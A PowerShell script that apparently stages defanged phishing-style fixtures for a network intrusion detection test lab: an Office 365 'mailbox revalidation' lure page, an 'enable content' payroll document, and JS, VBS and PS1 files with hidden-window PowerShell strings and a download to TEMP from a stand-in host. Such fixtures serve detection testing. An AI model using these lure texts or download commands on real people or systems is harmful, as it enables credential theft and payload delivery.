[CmdletBinding()]
param(
    [string]$WorkspaceRoot = "C:\NIDS_Workspace",
    [string]$TargetDir = ""
)

$ErrorActionPreference = "Stop"

$workspaceRootResolved = [System.IO.Path]::GetFullPath($WorkspaceRoot)
$incomingRoot = Join-Path $workspaceRootResolved "NIDS_TestLab\artifacts\incoming"
$runToken = "phishing-static-$(Get-Date -Format yyyyMMdd-HHmmss)"
$targetDirResolved = if ($TargetDir.Trim() -ne "") {
    [System.IO.Path]::GetFullPath($TargetDir)
} else {
    Join-Path $incomingRoot $runToken
}

New-Item -ItemType Directory -Force -Path $targetDirResolved | Out-Null

@'
<!DOCTYPE html>
<html>
<head>
  <title>Office 365 Mailbox Upgrade</title>
  <script>var mailbox = "verify";</script>
  <script>var prompt = "signin";</script>
  <script>var relay = "redirect";</script>
  <script>var submit = "complete";</script>
</head>
<body>
  <h1>Mailbox revalidation required</h1>
  <p>To avoid message delivery interruption, confirm your account details.</p>
  <a href="https://bit.ly/secure-mailbox-check">Sign in</a>
  <img src="https://mailbox-fix.ngrok-free.app/assets/logo.png" />
</body>
</html>
'@ | Set-Content -LiteralPath (Join-Path $targetDirResolved "01_mailbox_upgrade.html") -Encoding ASCII

@'
Confidential payroll notice

If this document opens blank, enable content and reopen it.
Protected compensation tables will load after editing is enabled.
'@ | Set-Content -LiteralPath (Join-Path $targetDirResolved "02_payroll_notice.docm") -Encoding ASCII

@'
var cmd = "cmd.exe /c start";
var url = "http://example.invalid/reset";
var action = "powershell -nop -w hidden";
eval("console.log('static fixture')");
'@ | Set-Content -LiteralPath (Join-Path $targetDirResolved "03_login_reset.js") -Encoding ASCII

@'
Set sh = CreateObject("WScript.Shell")
sh.Run "powershell -nop -c echo static fixture", 0
'@ | Set-Content -LiteralPath (Join-Path $targetDirResolved "04_voice_message.vbs") -Encoding ASCII

@'
$remote = "http://example.invalid/doc.bin"
powershell -NoProfile
Invoke-WebRequest -Uri $remote -OutFile "$env:TEMP\doc.bin"
'@ | Set-Content -LiteralPath (Join-Path $targetDirResolved "05_policy_update.ps1") -Encoding ASCII

@'
Town hall starts at 2 PM in Conference Room B.
'@ | Set-Content -LiteralPath (Join-Path $targetDirResolved "06_benign_notice.txt") -Encoding ASCII

Write-Output "Staged: $targetDirResolved"
